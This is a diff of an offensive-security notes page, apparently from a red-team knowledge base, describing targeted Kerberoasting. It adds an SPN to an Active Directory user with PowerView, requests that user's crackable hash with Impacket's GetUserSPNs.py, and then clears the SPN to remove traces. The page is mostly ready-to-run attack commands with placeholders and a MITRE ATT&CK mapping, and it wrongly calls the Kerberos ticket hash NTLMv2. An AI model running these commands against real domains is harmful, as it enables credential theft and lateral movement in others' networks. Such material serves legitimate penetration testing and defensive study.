@@ -31,11 +31,17 @@ Add a Service Principle Name (SPN) to an Active Directory user account, allowing
 
 Add a Service Principle Name (SPN) to an Active Directory user account, allowing others to retrieve the NTLMv2 hash via Kerberoasting. This requires a user with authorization to modify group membership, though once the SPN is set, any domain user can retrieve the hash.
 
+
+
 # Instructions
 
 1. Download PowerView (dev branch), and import it on the target machine: [Download from GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
 
 2. (Optional) It may be necessary to create a PS Credentials object of the user who is authorized to add SPN
+
+
+
+
 
 **Command** ([[Create a Windows PSCredential Object]]):
 
@@ -44,7 +50,15 @@ $Pass = ConvertTo-SecureString -String "$_PASSWORD" -AsPlainText -Force
 $Cred = New-Object -TypeName System.Management.Automation.PSCredential -Argument "$_DOMAIN\$_USER", $Pass
 ```
 
+
+
+
+
 3. Add a SPN to the target user (Identity)
+
+
+
+
 
 **Command** ([[PowerView Add SPN to a Domain User]]):
 
@@ -52,7 +66,15 @@ $Cred = New-Object -TypeName System.Management.Automation.PSCredential -Argument
 Set-DomainObject -Credential $Cred -Identity $_TARGET_USER -SET @{serviceprincipalname='nonexistent/$_DOMAIN'}
 ```
 
+
+
+
+
 4. Kerberoast the target user using [Impacket's GetUserSPN.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
+
+
+
+
 
 **Command** ([[GetUserSPN.py Query Domain for SPNs and Retrieve a User's NTLMv2 Hash]]):
 
@@ -60,13 +82,27 @@ Set-DomainObject -Credential $Cred -Identity $_TARGET_USER -SET @{serviceprincip
 GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_DOMAIN_IP -request -request-user $_TARGET_USER
 ```
 
+
+
+
+
 5. (Optional) Clean up by removing the SPN after retreiving the hash
+
+
+
+
 
 **Command** ([[PowerView Remove SPN to a Domain User]]):
 
 ```bash
 Set-DomainObject -Credential $Cred -Identity $_TARGET_USER -Clear serviceprincipalname
 ```
+
+
+
+
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -88,3 +124,5 @@ Set-DomainObject -Credential $Cred -Identity $_TARGET_USER -Clear serviceprincip
 ## Tags
 
 - [[kerberoast]]
+
+
